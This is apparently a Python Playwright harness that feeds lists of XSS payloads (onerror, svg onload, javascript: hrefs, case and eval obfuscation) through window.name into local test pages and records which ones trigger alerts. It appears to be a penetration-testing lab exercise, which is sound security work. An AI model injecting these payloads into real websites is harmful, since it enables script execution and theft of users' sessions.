import json
import asyncio
from playwright.async_api import async_playwright

# 要測試的 payload 列表
all_payloads = {}
all_payloads["innerHTML"] = [
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(`XSS`)'></iframe>",
    "<input autofocus onfocus=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>"
]

all_payloads["onerror"] = [
    'alert(`XSS_onerror_1`)',
    'alert(String.fromCharCode(88,83,83))',
    'confirm(document.domain)',
    'fetch(`http://127.0.0.1:8000/ping?from=onerror`)',
    'setTimeout(`alert(1)`, 100)',
]


all_payloads["href"] = [
    'javascript:alert(`XSS_href_1`)',
    'JaVaScRiPt:confirm(`XSS_href_2`)',
    'javascript:/*comment*/alert(1)',
    'javascript:eval(`ale` + `rt(1)`)',
    'javascript:void(alert(document.domain))',
]

async def test_payload(playwright, html_path: str, payload: str) -> bool:
    browser = await playwright.chromium.launch(headless=True)
    context = await browser.new_context()
    context.alert_triggered = False

    async def on_dialog(dialog):
        context.alert_triggered = True
        # print(f"Alert triggered: {dialog.message}")
        await dialog.dismiss()

    page = await context.new_page()
    page.on("dialog", on_dialog)

    # 使用 window.name 傳遞 payload
    await page.goto(html_path)
    await page.evaluate(f'window.name = {json.dumps(payload)}')
    await page.reload()
    await asyncio.sleep(4)

    await browser.close()
    return context.alert_triggered

async def main():
    async with async_playwright() as playwright:
        print("=== 開始測試 XSS Payloads ===")
        for payloads_typename, payloads in all_payloads.items():
            html_path = "http://127.0.0.1:5500/penetration_test_normal/test_" + payloads_typename + ".html"

            print(f"Testing: {payloads_typename}")
            for i, payload in enumerate(payloads):
                try:
                    result = await test_payload(playwright, html_path, payload)
                    if result:
                        print(f"[{i}] Triggered | {payload}")
                    else:
                        print(f"[{i}] Not Triggered | {payload}")
                except Exception as e:
                    print(f"[{i}] Error! | Payload: {payload}")
                    print(f"Error: {e}")
            print(f"=== 完成測試: {html_path} ===\n\n")

if __name__ == "__main__":
    asyncio.run(main())
